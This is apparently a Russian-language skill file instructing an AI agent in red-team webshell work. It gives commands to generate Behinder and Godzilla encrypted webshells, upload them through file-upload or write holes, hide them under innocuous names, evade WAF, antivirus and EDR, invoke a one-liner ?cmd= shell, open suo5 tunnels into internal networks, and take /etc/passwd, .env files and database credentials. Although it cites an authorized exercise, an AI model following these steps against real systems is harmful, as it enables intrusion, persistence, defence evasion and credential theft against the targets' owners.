# Набор инструментов WebShell (уже на месте)

Каталог `$DSH_HOME/redteam/toolkit/`, Java 25 установлена.

## Железное правило: размещать только шеллы Behinder / Godzilla (зашифрованные)

**Пользователь будет подключаться к этой точке входа напрямую клиентом Behinder/Godzilla из консоли**, поэтому:
- **По умолчанию размещайте только зашифрованные шеллы Behinder или Godzilla** и записывайте `shell_type` + `pass_key` в базу (`redteam_webshell_add`).
- **Однострочный шелл (`?cmd=`), самописный шелл и in-memory шелл не считаются передачей**: пользователь не подключится и не сможет работать интерактивно. Они допустимы только как **временный транзит** (например, чтобы доставить настоящий шелл или поднять туннель), и в note обязательно писать «временный транзит, не точка входа для передачи».
- Для генерации в GUI Godzilla нужен человек; **в приоритете способ «генерация шелла Behinder без GUI» ниже** — одна команда даёт готовый к передаче шелл.

## Генерация шелла Behinder без GUI (рекомендуется, скриптуется)

Шелл Behinder — это просто шаблон с записанным ключом: ключ = `md5(пароль_подключения)[:16]`. В репозитории есть шаблоны:
`$DSH_HOME/redteam/toolkit/Behinder/server/{shell.jsp,shell.jspx,shell_java9.jsp,shell.php,shell.aspx,shell.ashx,shell.asp}`

```bash
TK=$DSH_HOME/redteam/toolkit
PASS='Rt@2026#xz'                       # пароль подключения (генерируйте случайно, не используйте rebeyond)
KEY=$(printf '%s' "$PASS" | md5sum | cut -c1-16)   # Behinder требует первые 16 символов 32-символьного md5
# JSP: заменить ключ в шаблоне
sed "s/e45e329feb5d925b/$KEY/" $TK/Behinder/server/shell.jsp > /tmp/rt-shell.jsp
# PHP: то же самое (имя переменной в шаблоне $key)
sed "s/e45e329feb5d925b/$KEY/" $TK/Behinder/server/shell.php > /tmp/rt-shell.php
echo "пароль подключения $PASS ｜ ключ $KEY"      # оба значения нужно записать в runs/ и в redteam_webshell_add
```

- Ключ по умолчанию `e45e329feb5d925b` = `md5("rebeyond")[:16]` (именно это и означает комментарий в шаблоне) — **обязательно замените своим паролем**: с паролем по умолчанию вы просто отдаёте шелл защите.
- При наличии WAF или антивируса используйте unicode-вариант `shell_uni.jsp`: ключ тоже в экранированном виде, заменять посимвольно как `\\u00xx` (можно сгенерировать на python).
- Проверено: во всех семи шаблонах `shell.jsp / shell.jspx / shell_java9.jsp / shell.php / shell.aspx / shell.ashx / shell.asp` ключ меняется одной командой `sed` выше.

Шелл Godzilla (когда нужен GUI):
```bash
DISPLAY=:10.0 java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar
# Управление → Генерация: payload java/jsp, шифратор Java_AES_BASE64, пароль и ключ случайные → сгенерировать и загрузить
```

## После загрузки обязательно проверить, что «пользователь может подключиться»
1. `curl -s -o /dev/null -w '%{http_code}' "https://target/upload/x.jsp"` → ожидается 200 (**не проверяйте через GET с параметром cmd**: шеллы Behinder/Godzilla не отвечают на открытые команды).
2. В GUI Behinder или Godzilla создайте подключение (URL + пароль), нажмите «Проверить соединение» → успех только при подключении; затем выполните `id/whoami` в виртуальном терминале.
3. В базу нужно записать всё: `url`, `shell_type=behinder|godzilla`, `pass_key=пароль подключения`, `privilege`, `secret_ref` (файл доказательств); затем **сразу поднять туннель suo5** (навык `suo5-tunnel`).

## Обзор инструментов

| Инструмент | Команда запуска | Описание |
|---|---|---|
| Behinder v4.1 | `java -jar $DSH_HOME/redteam/toolkit/Behinder/Behinder.jar` | Трафик с шифрованием AES, JSP/PHP/ASPX |
| Godzilla v4.0.1 | `java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar` | Полностью зашифрованный payload для JSP/PHP/ASPX |
| AntSword | `$DSH_HOME/redteam/toolkit/AntSword/AntSword-Loader-v4.0.3-linux-x64/AntSword` | При первом запуске выберите каталог исходников `antSword-2.1.16` |
| Туннель suo5 | `./suo5-linux-amd64` | См. навык `suo5-tunnel` |

## Типовой процесс (авторизованное учение)
1. **Определить точку записи**: уязвимость загрузки / произвольная запись файла / загрузка плагина в админке / запись шаблона / запись файла из БД (`INTO OUTFILE`).
2. **Сгенерировать payload**: по языку цели выбрать JSP/JSPX/PHP/ASPX (см. выше «Генерация шелла Behinder без GUI»), пароль сгенерировать случайно и записать в `runs/`.
3. **Загрузить и обратиться**: `curl -s "https://target.example.com/upload/x.jsp"` — убедитесь, что вернулось 200; не кладите шелл в очевидный путь (вроде `/shell.jsp`), используйте случайное имя в стиле статических файлов.
4. **Управление подключением**: в инструменте добавьте URL + пароль и проверьте подключение; после успеха выполняйте команды в «виртуальном терминале».
5. **Закрепление и эксплуатация**:
   - Собрать `id/whoami/hostname/uname -a`, системные учётные записи, IP внутренней сети, маршруты.
   - **Сразу поднять туннель suo5 во внутреннюю сеть** (навык `suo5-tunnel` — это стандартный канал прорыва).
   - Забрать чувствительные файлы: `/etc/passwd`, конфиги, `.env`, исходники, строки подключения к БД → в `runs/`.
6. **Запись в базу**:
   - `redteam_webshell_add` (url / **shell_type** / **pass_key** / privilege / secret_ref)
   - `redteam_access_add` (host/аккаунт/способ webshell/права/ссылка на сессию)
   - `redteam_vuln_update` переводит входную уязвимость в `exploited`
   - `redteam_http_evidence_add` сохраняет запрос загрузки и запрос обращения к шеллу
   - `redteam_chain_add` (stage=exploit/access)

## Выполнение команд (только для временного транзита)
Если нужен только разовый запуск команд, используйте имеющийся RCE или туннель — однострочный шелл размещать не нужно:
```bash
# пример: выполнение через параметр временного однострочного шелла (удалить сразу после использования, не считается точкой входа)
curl -s "https://target.example.com/upload/x.jsp?cmd=id"
# Behinder/Godzilla — GUI-инструменты; из командной строки проще через туннель suo5 + обычные инструменты
```

## Замечания
- Сгенерированный шелл можно загружать только на **цель текущего авторизованного учения**; после работы удалите его (удалить файл, вернуть исходное состояние).
- GUI инструментов требует графической сессии (`DISPLAY=:10.0` доступен).
- Учётные данные — через `redteam_credential_add`: **открытый пароль в `secret_value`** (панель показывает его сразу, удобно переиспользовать), доказательства — в `runs/` со ссылкой в `secret_ref`. База активов находится только на этой машине: не выносите её или выгрузки.
- На цели может быть EDR/антивирус: сначала проверьте, жив ли шелл, чтобы не срабатывать многократными загрузками; при неудаче меняйте язык и кодирование (JSP→JSPX→PHP) или точку загрузки.
